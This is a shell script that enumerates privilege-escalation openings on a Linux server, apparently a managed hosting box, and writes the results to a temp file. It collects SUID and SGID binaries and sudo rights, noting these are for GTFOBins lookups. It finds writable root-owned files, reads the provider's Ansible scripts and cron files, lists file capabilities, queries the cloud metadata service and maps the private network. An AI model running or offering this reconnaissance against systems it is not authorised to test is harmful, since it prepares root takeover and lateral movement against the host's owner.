#!/bin/sh
OUT=/tmp/r.txt
{
echo "=== SUID ==="
find / -perm -4000 -type f 2>/dev/null | head -40
echo "=== SGID ==="
find / -perm -2000 -type f 2>/dev/null | head -40
echo "=== SUDO (the key one for GTFOBins) ==="
sudo -n -l 2>&1
echo "=== WRITABLE ROOT-OWNED (excl /proc /sys) ==="
find / -maxdepth 5 -writable -user root 2>/dev/null | grep -vE '/proc|/sys|/dev' | head -30
echo "=== /var/cw WRITABLE ==="
find /var/cw -writable 2>/dev/null | head -20
echo "=== ANSIBLE SCRIPTS (readable?) ==="
ls -la /var/cw/ansible/scripts/ 2>&1
find /var/cw/ansible/scripts -readable -type f 2>/dev/null | head -20
cat /var/cw/ansible/scripts/*.sh 2>&1 | head -80
echo "=== CRON ==="
ls -la /etc/cron.d/ /etc/cron.daily/ 2>&1
cat /etc/crontab 2>&1
echo "=== CAPABILITIES ON BINARIES ==="
getcap -r / 2>/dev/null | head -20
echo "=== NETWORK (passive, own-box only) ==="
ip route; ip neigh 2>/dev/null; arp -a 2>/dev/null
cat /etc/resolv.conf
curl -s --max-time 3 169.254.169.254/metadata/v1/interfaces/private/0/ipv4/ 2>&1
curl -s --max-time 3 169.254.169.254/metadata/v1/features/vpc_peering_enabled 2>&1; echo
ip addr                                          # all interfaces, incl eth1 if VPC
ip -6 route
curl -s --max-time 3 169.254.169.254/metadata/v1/interfaces/private/0/ipv4/gateway; echo
curl -s --max-time 3 169.254.169.254/metadata/v1/interfaces/ 2>&1   # how many NICs
netstat -rn 2>/dev/null || route -n 2>/dev/null   # routing fallback
cat /var/lib/cloud/scripts/peering.sh 2>/dev/null # the VPC peering script itself
ss -tlnp 2>/dev/null | head -20                   # what's listening on YOUR box
echo "=== DONE ==="
} > $OUT 2>&1
cat $OUT
